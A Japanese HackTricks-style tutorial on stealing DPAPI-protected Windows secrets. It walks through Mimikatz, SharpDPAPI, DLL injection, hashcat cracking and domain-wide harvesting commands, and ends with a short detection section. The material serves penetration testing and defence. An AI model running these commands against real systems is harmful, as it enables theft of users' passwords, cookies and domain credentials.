# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

データ保護API（DPAPI）は、主にWindowsオペレーティングシステム内で**非対称プライベートキーの対称暗号化**に利用され、ユーザーまたはシステムの秘密を重要なエントロピーのソースとして活用します。このアプローチは、開発者がユーザーのログオン秘密から派生したキーを使用してデータを暗号化できるようにすることで、暗号化を簡素化し、システム暗号化の場合はシステムのドメイン認証秘密を使用することで、開発者が暗号化キーの保護を自ら管理する必要を排除します。

DPAPIを使用する最も一般的な方法は、**`CryptProtectData`および`CryptUnprotectData`**関数を通じてであり、これによりアプリケーションは現在ログオンしているプロセスのセッションを使用してデータを安全に暗号化および復号化できます。これは、暗号化されたデータはそれを暗号化した同じユーザーまたはシステムによってのみ復号化できることを意味します。

さらに、これらの関数は**`entropy`パラメータ**も受け入れ、暗号化および復号化中に使用されます。したがって、このパラメータを使用して暗号化されたものを復号化するには、暗号化中に使用されたのと同じエントロピー値を提供する必要があります。

### ユーザーキーの生成

DPAPIは、各ユーザーの資格情報に基づいてユニークなキー（**`pre-key`**と呼ばれる）を生成します。このキーはユーザーのパスワードやその他の要因から派生し、アルゴリズムはユーザーのタイプによって異なりますが、最終的にはSHA1になります。たとえば、ドメインユーザーの場合、**ユーザーのHTLMハッシュに依存します**。

これは特に興味深いことで、攻撃者がユーザーのパスワードハッシュを取得できれば、次のことが可能になります：

- **そのユーザーのキーを使用してDPAPIで暗号化されたデータを復号化**することができ、APIに連絡する必要がありません
- **オフラインでパスワードをクラック**し、有効なDPAPIキーを生成しようとすること

さらに、ユーザーがDPAPIを使用してデータを暗号化するたびに、新しい**マスターキー**が生成されます。このマスターキーが実際にデータを暗号化するために使用されます。各マスターキーには、それを識別する**GUID**（グローバル一意識別子）が付与されます。

マスターキーは、**`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**ディレクトリに保存され、ここで`{SID}`はそのユーザーのセキュリティ識別子です。マスターキーはユーザーの**`pre-key`**によって暗号化され、回復のために**ドメインバックアップキー**でも暗号化されて保存されます（同じキーが2つの異なるパスで2回暗号化されて保存されます）。

注意すべきは、**マスターキーを暗号化するために使用されるドメインキーはドメインコントローラーにあり、決して変更されない**ため、攻撃者がドメインコントローラーにアクセスできれば、ドメインバックアップキーを取得し、ドメイン内のすべてのユーザーのマスターキーを復号化できることです。

暗号化されたブロブには、そのヘッダー内にデータを暗号化するために使用された**マスターキーのGUID**が含まれています。

> [!TIP]
> DPAPIで暗号化されたブロブは**`01 00 00 00`**で始まります

マスターキーを見つける：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
これはユーザーのマスタキーの一部の見た目です：

![](<../../images/image (1121).png>)

### マシン/システムキーの生成

これはマシンがデータを暗号化するために使用するキーです。これは**DPAPI_SYSTEM LSAシークレット**に基づいており、これはSYSTEMユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの資格情報やシステム全体のシークレットなど、システム自体がアクセスする必要があるデータを暗号化するために使用されます。

これらのキーは**ドメインバックアップを持っていない**ため、ローカルでのみアクセス可能であることに注意してください：

- **Mimikatz**は、コマンド`mimikatz lsadump::secrets`を使用してLSAシークレットをダンプすることでアクセスできます。
- シークレットはレジストリ内に保存されているため、管理者は**アクセスするためにDACL権限を変更することができます**。レジストリパスは`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`です。

### DPAPIによって保護されたデータ

DPAPIによって保護されている個人データには以下が含まれます：

- Windows資格情報
- Internet ExplorerおよびGoogle Chromeのパスワードと自動補完データ
- OutlookやWindows MailなどのアプリケーションのEメールおよび内部FTPアカウントのパスワード
- 共有フォルダ、リソース、ワイヤレスネットワーク、Windows Vaultのパスワード、暗号化キーを含む
- リモートデスクトップ接続、.NET Passport、およびさまざまな暗号化および認証目的のための秘密鍵のパスワード
- Credential Managerによって管理されるネットワークパスワードおよびSkype、MSNメッセンジャーなどのCryptProtectDataを使用するアプリケーション内の個人データ
- レジストリ内の暗号化されたブロブ
- ...

システム保護データには以下が含まれます：
- Wifiパスワード
- スケジュールされたタスクのパスワード
- ...

### マスタキー抽出オプション

- ユーザーがドメイン管理者権限を持っている場合、彼らは**ドメインバックアップキー**にアクセスしてドメイン内のすべてのユーザーマスタキーを復号化できます：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限を持っている場合、すべての接続ユーザーのDPAPIマスターキーとSYSTEMキーを抽出するために**LSASSメモリにアクセス**することが可能です。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSAシークレット**にアクセスしてマシンマスタキーを復号化できます:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたはNTLMハッシュが知られている場合、**ユーザーのマスターキーを直接復号化できます**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、**RPCを使用してマスターキーを復号化するためのバックアップキーをDCに要求する**ことが可能です。ローカル管理者であり、ユーザーがログインしている場合、これを行うために**彼のセッショントークンを盗む**ことができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## リストボールト
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI暗号化データへのアクセス

### DPAPI暗号化データの検索

一般的なユーザーの**保護されたファイル**は以下にあります：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで`\Roaming\`を`\Local\`に変更しても確認してください。

列挙の例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、および B64 ブロブ内の DPAPI 暗号化ブロブを見つけることができます:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意してください、[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（同じリポジトリから）は、DPAPIを使用してクッキーのような機密データを復号化するために使用できます。

### アクセスキーとデータ

- **SharpDPAPI**を使用して、現在のセッションからDPAPIで暗号化されたファイルから資格情報を取得します：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **資格情報情報を取得** 例えば、暗号化されたデータやguidMasterKey。
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **マスタキーにアクセス**:

RPCを使用して、**ドメインバックアップキー**を要求するユーザーのマスタキーを復号化します:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI**ツールは、マスターキーの復号化のためにこれらの引数もサポートしています（ドメインのバックアップキーを取得するために`/rpc`を使用したり、平文のパスワードを使用するために`/password`を使用したり、DPAPIドメインプライベートキーファイルを指定するために`/pvk`を使用することが可能であることに注意してください...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **マスターキーを使用してデータを復号化する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI**ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps`の復号化のためにこれらの引数もサポートしています（ドメインのバックアップキーを取得するために`/rpc`を使用することができ、平文パスワードを使用するために`/password`、DPAPIドメインプライベートキーファイルを指定するために`/pvk`、現在のユーザーのセッションを使用するために`/unprotect`を使用することができることに注意してください...）：
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- **現在のユーザーセッション**を使用してデータを復号化する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### オプショナルエントロピーの取り扱い ("サードパーティエントロピー")

一部のアプリケーションは、`CryptProtectData` に追加の **エントロピー** 値を渡します。この値がないと、正しいマスタキーが知られていても、ブロブを復号化することはできません。したがって、この方法で保護された資格情報をターゲットにする際には、エントロピーを取得することが不可欠です（例：Microsoft Outlook、一部のVPNクライアント）。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内のDPAPI関数をフックし、提供された任意のエントロピーを透過的に記録するユーザーモードDLLです。`outlook.exe` や `vpnclient.exe` のようなプロセスに対して **DLLインジェクション** モードでEntropyCaptureを実行すると、各エントロピーバッファを呼び出しプロセスとブロブにマッピングしたファイルが出力されます。キャプチャされたエントロピーは、後で **SharpDPAPI** (`/entropy:`) または **Mimikatz** (`/entropy:<file>`) に供給してデータを復号化するために使用できます。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### マスターキーのオフラインクラッキング (Hashcat & DPAPISnoop)

Microsoftは、Windows 10 v1607（2016）から**context 3**マスターキー形式を導入しました。`hashcat` v6.2.6（2023年12月）は、**22100**（DPAPIマスターキーv1コンテキスト）、**22101**（コンテキスト1）、および**22102**（コンテキスト3）のハッシュモードを追加し、マスターキーファイルからユーザーパスワードを直接GPU加速でクラッキングできるようにしました。攻撃者は、ターゲットシステムと対話することなく、ワードリストまたはブルートフォース攻撃を実行できます。

`DPAPISnoop`（2024）は、このプロセスを自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
ツールは、CredentialおよびVaultのブロブを解析し、クラッキングされたキーで復号化し、平文のパスワードをエクスポートすることもできます。

### 他のマシンのデータにアクセスする

**SharpDPAPI**および**SharpChrome**では、リモートマシンのデータにアクセスするために**`/server:HOST`**オプションを指定できます。もちろん、そのマシンにアクセスできる必要があり、以下の例では**ドメインバックアップ暗号化キーが知られている**と仮定しています。
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP ディレクトリからすべてのユーザーとコンピュータを抽出し、RPC を通じてドメインコントローラのバックアップキーを抽出するツールです。スクリプトはすべてのコンピュータの IP アドレスを解決し、すべてのコンピュータで smbclient を実行して、すべてのユーザーの DPAPI ブロブを取得し、ドメインバックアップキーでそれを復号化します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピュータのリストを使用すると、知らなかったサブネットをすべて見つけることができます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI によって保護された秘密を自動的にダンプできます。2.x リリースでは以下が導入されました：

* 数百のホストからのブロブの並列収集
* **context 3** マスタキーの解析と自動 Hashcat クラッキング統合
* Chrome の「アプリバウンド」暗号化クッキーのサポート（次のセクションを参照）
* エンドポイントを繰り返しポーリングし、新しく作成されたブロブを差分化する新しい **`--snapshot`** モード

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、マスタキー/資格情報/ボールトファイルの C# パーサーで、Hashcat/JtR 形式で出力でき、オプションで自動的にクラッキングを呼び出すことができます。Windows 11 24H1 までのマシンおよびユーザーマスタキー形式を完全にサポートしています。

## 一般的な検出

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連ディレクトリへのアクセス。
- 特に **C$** や **ADMIN$** のようなネットワーク共有から。
- LSASS メモリにアクセスしたり、マスタキーをダンプするために **Mimikatz**、**SharpDPAPI** または類似のツールを使用すること。
- イベント **4662**: *オブジェクトに対して操作が行われました* – **`BCKUPKEY`** オブジェクトへのアクセスと相関させることができます。
- プロセスが *SeTrustedCredManAccessPrivilege*（資格情報マネージャー）を要求する際のイベント **4673/4674**。

---
### 2023-2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI セキュアチャネルの偽装**（2023年11月）。ネットワークアクセスを持つ攻撃者は、ドメインメンバーを騙して悪意のある DPAPI バックアップキーを取得させ、ユーザーマスタキーの復号化を可能にします。2023年11月の累積更新でパッチが適用されました – 管理者は DC とワークステーションが完全にパッチされていることを確認する必要があります。
* **Chrome 127 の「アプリバウンド」クッキー暗号化**（2024年7月）は、従来の DPAPI のみの保護を、ユーザーの **Credential Manager** に保存された追加のキーで置き換えました。オフラインでのクッキーの復号化には、DPAPI マスタキーと **GCM ラップされたアプリバウンドキー** の両方が必要です。SharpChrome v2.3 と DonPAPI 2.x は、ユーザーコンテキストで実行することで追加のキーを回復できます。

## 参考文献

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
